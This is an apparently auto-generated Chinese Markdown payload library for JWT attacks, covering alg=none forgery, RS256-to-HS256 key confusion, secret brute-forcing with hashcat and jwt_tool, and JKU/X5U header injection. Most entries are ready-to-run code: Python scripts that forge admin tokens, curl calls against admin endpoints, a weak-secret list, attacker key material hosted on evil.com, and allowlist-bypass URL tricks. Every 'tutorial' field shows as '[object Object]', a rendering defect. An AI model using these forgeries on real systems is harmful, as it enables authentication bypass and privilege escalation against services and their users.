# JWT安全 — Web 攻击 payload

> 来源：src-hunter `references/payloader/raw/web.json`（4 条）
> 本文件由 `scripts/build-src-hunter-payloader.mjs` 从结构化 JSON 生成；上游同名 `.md` 为乱码，已弃用。

---
### 1. JWT None算法攻击

- **id:** `jwt-none-attack`
- **分类:** JWT安全 / 算法攻击
- **tags:** `JWT` `none算法` `认证绕过` `令牌伪造` `CVE-2015-2951`

利用JWT库对"none"算法的支持缺陷，将JWT头部的签名算法修改为none后移除签名部分，构造无需密钥即可通过验证的伪造令牌。这是最经典的JWT漏洞之一。

**前置条件**

- 目标使用JWT进行身份认证
- jwt_tool或Python PyJWT库

**利用步骤**

#### 1. 解码现有JWT

```
# 解码JWT的三个部分
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f1 | base64 -d
# 输出: {"alg":"HS256","typ":"JWT"}

echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJyb2xlIjoidXNlciJ9.signature" | cut -d. -f2 | base64 -d
# 输出: {"user":"guest","role":"user"}
```

解析JWT的Header和Payload部分，识别算法和声明内容

| 片段 | 说明 | 类型 |
|---|---|---|
| `cut -d. -f1` | 以点号分割取第一段(Header) | command |
| `base64 -d` | Base64解码 | command |
| `"alg":"HS256"` | 当前使用HMAC-SHA256签名 | json |
| `"role":"user"` | 用户角色声明——攻击目标 | json |

#### 2. 构造None算法JWT

```
import base64, json

# 修改Header为none算法
header = base64.urlsafe_b64encode(
    json.dumps({"alg":"none","typ":"JWT"}).encode()
).rstrip(b"=").decode()

# 修改Payload为admin
payload = base64.urlsafe_b64encode(
    json.dumps({"user":"admin","role":"admin"}).encode()
).rstrip(b"=").decode()

# 签名为空
forged_jwt = f"{header}.{payload}."
print(forged_jwt)
```

Python脚本构造alg=none的伪造JWT，提权为admin

| 片段 | 说明 | 类型 |
|---|---|---|
| `"alg":"none"` | 设置签名算法为none(无签名) | json |
| `"role":"admin"` | 将角色篡改为管理员 | json |
| `urlsafe_b64encode` | URL安全的Base64编码 | function |
| `rstrip(b"=")` | 移除Base64填充符号 | function |

#### 3. jwt_tool自动攻击

```
python3 jwt_tool.py {TOKEN} -X a

# -X a = 尝试none算法攻击
# 同时测试多种none变体
# none, None, NONE, nOnE, noNe
```

使用jwt_tool自动化测试none算法及其大小写变体

| 片段 | 说明 | 类型 |
|---|---|---|
| `jwt_tool.py` | JWT安全测试工具 | command |
| `-X a` | 启用alg:none攻击模式 | parameter |
| `none变体` | 测试None/NONE/nOnE等大小写绕过 | concept |

#### 4. 验证伪造令牌

```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/dashboard"

# 检查是否获得管理员权限
# 200 OK = 攻击成功
# 401/403 = 服务端正确拒绝none算法
```

使用伪造的JWT访问管理员接口验证攻击效果

| 片段 | 说明 | 类型 |
|---|---|---|
| `Bearer {FORGED_JWT}` | 使用伪造的JWT令牌 | header |
| `/api/admin/dashboard` | 管理员专属接口 | path |

**WAF 绕过**

#### none算法大小写变体

```
# 各种none变体
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"noNe"}
{"alg":"nONE"}

# 添加签名占位
header.payload.
header.payload.AA==
header.payload.e30=
```

使用none的各种大小写组合和不同签名占位绕过校验

| 片段 | 说明 | 类型 |
|---|---|---|
| `nOnE/noNe` | 混合大小写绕过字符串比较 | encoding |
| `.AA==` | 非空签名占位可能绕过空签名检测 | technique |

**教程**

[object Object]

---

### 2. JWT密钥混淆攻击(RS→HS)

- **id:** `jwt-key-confusion`
- **分类:** JWT安全 / 算法攻击
- **tags:** `JWT` `密钥混淆` `RS256` `HS256` `算法篡改`

当服务端使用RSA公钥验证JWT时，攻击者将算法从RS256改为HS256，此时服务端会错误地使用RSA公钥作为HMAC密钥进行验证。由于RSA公钥是公开的，攻击者可用它签名任意JWT。

**前置条件**

- 目标JWT使用RS256/RS384/RS512算法
- 已获取RSA公钥
- jwt_tool或Python

**利用步骤**

#### 1. 获取RSA公钥

```
# 常见公钥泄露位置
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/api/keys" | jq
curl -s "https://{TARGET}/oauth/discovery" | jq

# 从JWKS中提取公钥
# 或从SSL证书中获取
openssl s_client -connect {TARGET}:443 | openssl x509 -pubkey -noout > pubkey.pem
```

从JWKS端点、API或SSL证书中获取RSA公钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `/.well-known/jwks.json` | JWKS标准公钥发布端点 | path |
| `jq` | JSON格式化工具 | command |
| `openssl x509 -pubkey` | 从X509证书中提取公钥 | command |

#### 2. 密钥混淆攻击

```
import jwt
import json

# 读取RSA公钥
with open("pubkey.pem", "rb") as f:
    public_key = f.read()

# 用公钥作为HMAC密钥签名
forged_payload = {
    "user": "admin",
    "role": "admin",
    "iat": 1707811200,
    "exp": 1999999999
}

# 将算法从RS256切换为HS256
forged_token = jwt.encode(
    forged_payload,
    public_key,        # RSA公钥作为HMAC密钥
    algorithm="HS256"  # 改为HMAC算法
)
print(forged_token)
```

Python脚本将RSA公钥作为HMAC密钥签名伪造JWT

| 片段 | 说明 | 类型 |
|---|---|---|
| `jwt.encode` | PyJWT编码函数 | function |
| `public_key` | RSA公钥被错误地用作HMAC密钥 | variable |
| `algorithm="HS256"` | 将算法从RS256改为HS256 | parameter |
| `"exp": 1999999999` | 设置超远过期时间 | json |

#### 3. jwt_tool自动攻击

```
python3 jwt_tool.py {TOKEN} -X k -pk pubkey.pem

# -X k = 密钥混淆攻击模式
# -pk = 指定公钥文件
# 工具自动完成RS256→HS256切换和签名
```

jwt_tool一键执行密钥混淆攻击

| 片段 | 说明 | 类型 |
|---|---|---|
| `-X k` | 启用Key Confusion攻击模式 | parameter |
| `-pk pubkey.pem` | 指定RSA公钥文件路径 | parameter |

#### 4. JWKS端点注入

```
# 如果支持jku/x5u头，可注入自定义JWKS端点
Header: {
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://evil.com/.well-known/jwks.json"
}

# 在evil.com上托管攻击者生成的JWKS
# 服务端会从攻击者URL获取公钥进行验证
openssl genrsa -out attacker_key.pem 2048
openssl rsa -in attacker_key.pem -pubout > attacker_pub.pem
```

JKU/X5U头注入使服务端从攻击者控制的URL获取验证密钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `"jku"` | JWK Set URL——指定公钥来源 | header |
| `evil.com` | 攻击者控制的密钥托管服务器 | domain |
| `openssl genrsa` | 生成攻击者自己的RSA密钥对 | command |

**WAF 绕过**

#### 多种公钥格式尝试

```
# PEM格式(标准)
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqh...
-----END PUBLIC KEY-----

# DER格式(二进制)
openssl rsa -pubin -in pubkey.pem -outform DER -out pubkey.der

# 带/不带换行符
cat pubkey.pem | tr -d "\n" > pubkey_noline.pem

# 不同编码的公钥作为HMAC密钥
```

某些JWT库对公钥格式处理不同，尝试多种格式

| 片段 | 说明 | 类型 |
|---|---|---|
| `PEM/DER` | 两种主要公钥编码格式 | format |
| `tr -d "\n"` | 移除换行符(单行公钥) | command |

**教程**

[object Object]

---

### 3. JWT密钥爆破

- **id:** `jwt-secret-bruteforce`
- **分类:** JWT安全 / 密钥破解
- **tags:** `JWT` `密钥爆破` `HS256` `弱密钥` `hashcat`

当JWT使用HMAC对称算法(HS256/HS384/HS512)且密钥为弱密码时，可通过字典或暴力破解还原签名密钥，进而伪造任意JWT令牌。

**前置条件**

- 目标JWT使用HMAC算法(HS256等)
- 已获取有效JWT样本
- hashcat或jwt_tool

**利用步骤**

#### 1. 确认算法和结构

```
# 解码JWT Header
echo "eyJhbGciOiJIUzI1NiJ9" | base64 -d
# {"alg":"HS256"}

# 确认是HMAC对称算法才可爆破
# HS256 / HS384 / HS512 = 可爆破
# RS256 / ES256 = 不可直接爆破密钥
```

确认JWT使用HMAC对称算法，此类算法的密钥可被爆破

| 片段 | 说明 | 类型 |
|---|---|---|
| `"alg":"HS256"` | HMAC-SHA256——对称算法可爆破 | json |
| `base64 -d` | 解码JWT Header | command |

#### 2. hashcat GPU加速爆破

```
# hashcat模式16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt.txt内容为完整的JWT字符串
# eyJhbGci....signature

# 使用规则加速
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码暴力破解(8位数字密钥)
hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
```

hashcat GPU加速破解JWT HMAC密钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `-m 16500` | hashcat JWT模式 | parameter |
| `-a 0` | 字典攻击模式 | parameter |
| `-a 3` | 暴力/掩码攻击模式 | parameter |
| `?d` | 数字掩码占位符(0-9) | format |
| `rockyou.txt` | 常用密码字典 | path |

#### 3. jwt_tool字典爆破

```
python3 jwt_tool.py {TOKEN} -C -d /usr/share/wordlists/rockyou.txt

# -C = 开启字典破解模式
# -d = 指定字典文件
# 也支持常见弱密钥快速测试
python3 jwt_tool.py {TOKEN} -C -d common_jwt_secrets.txt
```

jwt_tool字典模式破解JWT密钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `-C` | 启用Crack模式(密钥爆破) | parameter |
| `-d` | 指定密码字典路径 | parameter |

#### 4. 使用破解密钥伪造JWT

```
import jwt

secret = "cracked_secret_key"

forged = jwt.encode(
    {"user": "admin", "role": "superadmin", "exp": 1999999999},
    secret,
    algorithm="HS256"
)
print(f"Forged JWT: {forged}")

# 验证
curl -H "Authorization: Bearer $FORGED_JWT" "https://{TARGET}/api/admin"
```

使用破解出的密钥签名伪造管理员JWT

| 片段 | 说明 | 类型 |
|---|---|---|
| `"cracked_secret_key"` | 爆破获得的密钥 | value |
| `jwt.encode` | 使用破解密钥重新签名 | function |

**WAF 绕过**

#### 常见默认JWT密钥

```
# 常见弱密钥列表
secret
password
123456
hs256-secret
jwt-secret
my-secret-key
changeme
default
qwerty
super-secret
your-256-bit-secret
secretkey
token-secret
application-secret
```

优先尝试常见的默认/弱JWT密钥

| 片段 | 说明 | 类型 |
|---|---|---|
| `your-256-bit-secret` | jwt.io默认示例密钥 | value |
| `changeme` | 常见默认密码 | value |

**教程**

[object Object]

---

### 4. JWT JKU/X5U头注入

- **id:** `jwt-jku-x5u-injection`
- **分类:** JWT安全 / Header注入
- **tags:** `JWT` `JKU` `X5U` `Header注入` `JWKS` `密钥劫持`

利用JWT Header中的jku(JWK Set URL)或x5u(X.509 URL)参数，将密钥来源指向攻击者控制的服务器，使服务端使用攻击者的公钥验证JWT，从而实现令牌伪造。

**前置条件**

- 目标JWT支持jku/x5u Header参数
- 攻击者拥有公网服务器
- Python环境

**利用步骤**

#### 1. 探测JKU/X5U支持

```
# 解码JWT Header查看是否包含jku/x5u
echo "{JWT_HEADER}" | base64 -d | jq

# 常见原始Header
{"alg":"RS256","typ":"JWT","jku":"https://target.com/.well-known/jwks.json"}

# 检查JWKS端点
curl -s "https://{TARGET}/.well-known/jwks.json" | jq
curl -s "https://{TARGET}/.well-known/openid-configuration" | jq .jwks_uri
```

检查JWT是否使用jku/x5u头以及目标JWKS端点

| 片段 | 说明 | 类型 |
|---|---|---|
| `"jku"` | JWK Set URL——指向JWKS公钥集合 | header |
| `.well-known/jwks.json` | OpenID Connect标准JWKS端点 | path |
| `.jwks_uri` | OpenID配置中的JWKS URL字段 | json |

#### 2. 生成攻击者密钥对

```
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# 生成RSA密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 导出PEM格式
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# 生成JWKS格式公钥
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
```

生成攻击者的RSA密钥对并构造JWKS文件

| 片段 | 说明 | 类型 |
|---|---|---|
| `rsa.generate_private_key` | 生成2048位RSA密钥对 | function |
| `"kty": "RSA"` | JWKS密钥类型 | json |
| `"kid"` | Key ID——标识密钥 | json |

#### 3. 托管JWKS并签名JWT

```
# 在攻击者服务器托管jwks.json
python3 -m http.server 8080
# http://evil.com:8080/jwks.json

import jwt

# 用攻击者私钥签名
with open("attacker_private.pem", "rb") as f:
    attacker_key = f.read()

forged = jwt.encode(
    {"user": "admin", "role": "admin", "exp": 1999999999},
    attacker_key,
    algorithm="RS256",
    headers={"jku": "http://evil.com:8080/jwks.json", "kid": "attacker-key-1"}
)
print(forged)
```

托管JWKS文件并用攻击者私钥签名JWT，jku指向攻击者服务器

| 片段 | 说明 | 类型 |
|---|---|---|
| `python3 -m http.server` | 快速HTTP文件服务 | command |
| `"jku": "http://evil.com:8080/jwks.json"` | jku指向攻击者的JWKS | header |
| `"kid": "attacker-key-1"` | 匹配JWKS中的kid | json |

#### 4. 验证攻击

```
curl -s -H "Authorization: Bearer {FORGED_JWT}" \
  "https://{TARGET}/api/admin/users" | jq

# 服务端流程：
# 1. 解析JWT Header中的jku URL
# 2. 从evil.com获取JWKS公钥
# 3. 用攻击者公钥验证签名——通过!
# 4. 信任Payload中的admin身份
```

使用注入了jku的伪造JWT访问管理员接口

| 片段 | 说明 | 类型 |
|---|---|---|
| `{FORGED_JWT}` | 包含攻击者jku的伪造令牌 | variable |
| `/api/admin/users` | 管理员接口 | path |

**WAF 绕过**

#### JKU URL绕过限制

```
# 开放重定向绕过域名白名单
{"jku": "https://target.com/redirect?url=https://evil.com/jwks.json"}

# 子域名接管
{"jku": "https://abandoned.target.com/.well-known/jwks.json"}

# URL混淆
{"jku": "https://target.com@evil.com/jwks.json"}
{"jku": "https://evil.com#target.com/jwks.json"}
{"jku": "https://evil.com/.well-known/jwks.json?.target.com"}
```

利用开放重定向、子域名接管、URL混淆绕过jku域名白名单

| 片段 | 说明 | 类型 |
|---|---|---|
| `redirect?url=` | 利用开放重定向跳转到攻击者域名 | technique |
| `target.com@evil.com` | URL用户名混淆——实际访问evil.com | technique |

**教程**

[object Object]
